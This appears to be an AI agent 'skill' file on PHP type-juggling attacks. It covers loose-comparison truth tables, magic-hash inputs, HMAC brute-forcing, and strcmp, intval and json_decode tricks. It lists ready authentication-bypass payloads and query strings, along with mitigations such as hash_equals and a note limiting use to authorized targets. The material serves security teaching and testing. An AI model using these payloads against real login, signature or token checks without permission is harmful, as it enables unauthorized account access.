---
name: type-juggling
description: >-
  PHP type juggling and weak comparison (`==`) bypass. Use when authentication, HMAC/signature checks, or token validation uses loose equality, numeric coercion, or hash comparisons without strict types — common in legacy PHP and CTF-style code paths.
---

# SKILL: PHP Type Juggling — Weak Comparison & Magic Hash Bypass

> **AI LOAD INSTRUCTION**: PHP `==` coercion, magic hashes (`0e…`), HMAC/hash loose checks, NULL from bad types, and CTF-style `strcmp` / `json_decode` / `intval` tricks. Use strict routing: map the sink (`==` vs `hash_equals`), PHP major version, and whether both operands are attacker-controlled. Routing note: when you encounter PHP login/signature logic or code like `md5($_GET['x'])==md5($_GET['y'])`, start with this skill; if `hash_equals`/`===` is already used, this path usually does not apply.

## 0. QUICK START

**First-pass goal**: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password.

### First-pass payloads (auth / token shape)

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

### Minimal PHP probes (local or `php -r` in lab)

```php
<?php
// Loose compare probes — run in target PHP major version if possible
var_dump('0e123' == '0e999');
var_dump('123a' == 123);
var_dump(md5('240610708') == md5('QNKCDZO'));
```

### Routing hints

| Clue | Next step |
|---|---|
| Source code uses `==` to compare passwords, tokens, or HMAC values | Go to Sections 1-3 |
| `md5($a) == md5($b)` or loose `sha1` comparison | Section 2 magic hashes |
| `hash_hmac(...) != '0'` or compared with `"0"` | Section 3 |
| `strcmp`、`json_decode(..., true)`、`intval` | Section 5 |

---

## 1. LOOSE COMPARISON (`==`) — TRUTH TABLE & VERSIONS

PHP compares operands with type juggling unless you use `===` or `hash_equals()` for secrets.

### 1.1 Core examples (strings vs numbers)

| Expression | Result | Mechanism (short) |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | Both strings look numeric → compared as **floats**; both parse to **1000.0** (not zero — common exam trap; see next row for real “both zero”) |
| `'0e462097431906509019562988736854' == '0e830400451993494058024219903391'` | **true** | Both parse as **0.0** in scientific notation |
| `'123a' == 123` | **true** | String cast to int stops at first non-digit → `123` |
| `'abc' == 0` | **true** (PHP **7.x and earlier**) | Non-numeric string compared to int → string becomes `0` |
| `'' == 0` | **true** | Empty string → `0` |
| `'' == false` | **true** | both “falsy” in loose rules |
| `false == NULL` | **true** | loose equality |
| `0 == false` | **true** | loose equality |
| `'' == 0 == false == NULL` | **true** (chain) | Each adjacent pair is **true** under `==` (`''==0`, `0==false`, `false==NULL`) — classic “falsy” chain |
| `'0' == false` | **true** | String `'0'` is the **only** non-empty string that compares as false to boolean |
| `'php' == 0` | **false** (PHP **8+**) | PHP 8: non-numeric string **no longer** equals `0` |

### 1.2 PHP 5 vs 7 vs 8 (high-signal deltas)

| Topic | PHP 5.x / 7.x (typical) | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** (string → 0) | **false** |
| String-to-number for `"123a"` | Still truncates for `(int)` / numeric compare in many `==` paths | Same idea for numeric strings; **non-numeric** vs int fixed as above |
| `md5([])` / `sha1([])` | May warn / `NULL`-like behavior in older patterns | **TypeError** for wrong types — kills classic `[]` tricks unless error handling collapses to NULL |

**Tester takeaway**: always note **PHP version** from headers, `X-Powered-By`, or fingerprint; a payload that works on PHP 7 may fail on PHP 8.

### 1.3 Safe alternative (defense / verification)

```php
hash_equals((string)$expected, (string)$actual);  // timing-safe, strict string
// or
$expected === $actual;
```

---

## 2. MAGIC HASHES (`0e…` + digits only)

When both sides are **hex-looking hash strings** that match `^0e[0-9]+$`, PHP treats them as **floats in scientific notation** → value **0.0**. Then `md5(A) == md5(B)` is **true** even though digests differ as strings.

### 2.1 Reference table (MD5 / SHA-1 and longer algos)

| Algorithm | Example input | Digest (starts with `0e` + all decimal digits) |
|---|---|---|
| **MD5** | `240610708` | `0e462097431906509019562988736854` |
| **MD5** | `QNKCDZO` | `0e830400451993494058024219903391` |
| **SHA-1** | `10932435112` | `0e07766915004133176347055865026311692244` |
| **SHA-224** | *(brute-force / precomputed)* | Example form: `0e` + decimal digits only → `==` with another such string is true |
| **SHA-256** | *(brute-force / precomputed)* | Same pattern: only strings matching `^0e\d+$` collide under `==` |

**Why it works**: `md5('240610708') == md5('QNKCDZO')` → both sides match `^0e[0-9]+$` → both interpreted as **0.0 == 0.0** → **true**.

### 2.2 Exploit pattern in code

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // intended: different strings, same md5 (impossible for md5)
    // actual: two different strings whose *digests* are magic hashes
}
```

### 2.3 Payload sketch (pair hunting)

```text
?a=240610708&b=QNKCDZO
```

For SHA-224/256, treat as **search problem**: brute-force inputs until digest matches `^0e\d+$`; pair two distinct inputs. Longer hashes = harder; MD5/SHA1 examples above are the usual teaching set.

---

## 3. HMAC BYPASS (LOOSE COMPARE VS `"0"` OR `0`)

If logic uses **loose** inequality against a constant:

```php
if (hash_hmac('md5', $data, $key) != '0') { /* ok */ }
// or == 0, == false with string "0e...", etc.
```

Brute-force **`$data`** (e.g. timestamp, nonce, counter) until `hash_hmac` output matches **`^0e[0-9]+$`** (for MD5 output) or the code’s specific loose rule — then the hash may compare equal to `0` or to another magic digest under `==`.

### Example (MD5-style `0e` digest for a numeric message)

| Concept | Example |
|---|---|
| Message type | Unix timestamp, incrementing id, millisecond clock |
| Timestamp brute-force pattern | Tutorials sometimes cite `1539805986` → `0e772967136366835494939987377058` as a **magic-hash style** example; **`md5('1539805986')` does not yield that digest** in stock PHP — use the idea (scan timestamps / counters until output matches `^0e[0-9]+$`) and **always verify against the exact function + key** in the target code. |
| Goal | Find `$data` such that `hash_hmac('md5', $data, $key)` matches `^0e[0-9]+$` |
| Note | Without knowing `$key`, you may still brute **`$data`** if algorithm/output are visible in a oracle; CTFs often leak or fix key |

```text
# Conceptual: try many timestamps
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**Mitigation**: `hash_equals($mac, $expected)` + fixed-length hex/binary encoding; never compare HMAC to bare `"0"`.

---

## 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)

Invalid types can yield **`NULL`** on the compared side; loose equality to another `NULL` or coerced value may pass.

| Call | Typical PHP 7/8 behavior |
|---|---|
| `md5([])` | PHP 8: **TypeError**; older: warnings / not reliable across versions |
| `sha1([])` | Same |
| **Idea** | If error handler or custom wrapper converts failures to **`NULL`**, then `NULL == NULL` or `NULL == sha1("x")` if other side is also NULL |

```php
// CTF / broken code mental model:
@sha1($_GET['x']) == @sha1($_GET['y']);  // if both error to NULL → true
```

**Real audits**: look for **`@`**, custom `try/catch` that sets hash to `null`, or user input passed where a string is required.

---

## 5. CTF PATTERNS

### 5.1 `strcmp` / `strcasecmp` with arrays

```php
strcmp([], "password");  // NULL in PHP 7/8 (invalid args)
// NULL == 0  → true in loose compare if code does:
if (strcmp($_GET['p'], $secret) == 0)
```

Payload:

```text
?p[]=1
```

### 5.2 `intval` bypass

```php
// Hex: base 0 lets PHP interpret 0x prefix (version-dependent; always verify)
intval("0x1A", 0);   // → 26

// Octal: leading 0 can be parsed as octal with base 0
intval("010", 0);  // → 8 (classic teaching example; confirm on target PHP)

// Scientific notation: intval() alone stops at 'e'; cast via float first
intval((float) "1e2"); // → 100
```

```text
?id=0x1A
?id=010
?id=1e2
```

### 5.3 `json_decode` + `true` for associative array auth

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "nonempty" often true — see PHP loose rules
```

### 5.4 `is_numeric` + loose compare

```php
is_numeric("0e12345");  // true
"0e12345" == 0;         // true (scientific notation → 0.0)
```

### 5.5 Deserialization + magic properties

Unserialize user input into objects whose `__toString` or properties feed into `md5($obj)` or loose compare — combine with **magic hash** strings on properties (CTF). Look for `unserialize($_…)` near `==` on hashes.

---

## 6. DECISION TREE

```text
                         +------------------+
                         | PHP loose compare|
                         | or hash == hash? |
                         +--------+---------+
                                  |
                    +-------------+-------------+
                    |                           |
             +------v------+             +------v------+
             | Uses === or |             | Uses == or   |
             | hash_equals |             | strcmp == 0  |
             +------+------+             +------+-------+
                    |                           |
               STOP (likely)              +-----v-----+
                                          | Operand   |
                                          | types?    |
                                          +-----+-----+
                           +--------------+---+--------------+
                           |              |                  |
                    +------v------+ +-----v-----+    +-------v--------+
                    | Both numeric| | One int & |    | Hash digests   |
                    | strings 0e… | | one string|    | both 0e\d+ ?   |
                    +------+------+ +-----+-----+    +-------+--------+
                           |              |                  |
                      MAGIC HASH    STRING/INT           MAGIC HASH
                      COLLISION     JUGGLING             (md5/sha1/…)
                           |              |                  |
                           +------+-------+------------------+
                                  |
                           +------v------+
                           | HMAC / MAC  |
                           | vs "0"      |
                           +------+------+
                                  |
                           brute $data
                           for 0e… digest
                                  |
                           +------v------+
                           | Arrays /    |
                           | json true / |
                           | strcmp([])  |
                           +-------------+
```

### Tool references

| Tool | Use |
|---|---|
| Local `php` CLI | Reproduce `==` behavior for target major version |
| Static code review | Grep `==`, `!=` on crypto outputs; find missing `hash_equals` |
| CTF frameworks | Payload generators for magic hashes and `0e` search |

---

**Safety & scope**: Use only on **authorized** targets (CTF, lab, written permission). This skill explains **language semantics** for defense and assessment — not a license to attack systems without consent.
